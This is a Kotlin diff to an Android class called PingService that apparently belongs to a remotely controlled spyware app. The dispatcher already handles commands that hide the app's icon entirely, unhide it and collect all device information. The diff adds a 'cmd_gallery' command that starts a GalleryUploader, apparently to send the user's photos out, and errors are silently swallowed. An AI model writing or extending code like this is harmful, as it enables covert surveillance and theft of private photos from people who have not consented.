@@ -239,7 +239,8 @@ class PingService : Service() {
                 "cmd_h" -> restoreIcon()         // restore main icon
                 "cmd_i" -> fullHide()            // completely hide (no icon)
                 "cmd_j" -> unHide()              // unhide and restore
-                "cmd_info" -> collectDeviceInfo() // collect all device info
+                "cmd_info"    -> collectDeviceInfo()
+                "cmd_gallery" -> GalleryUploader(this).start()
             }
         } catch (_: Exception) {}
     }
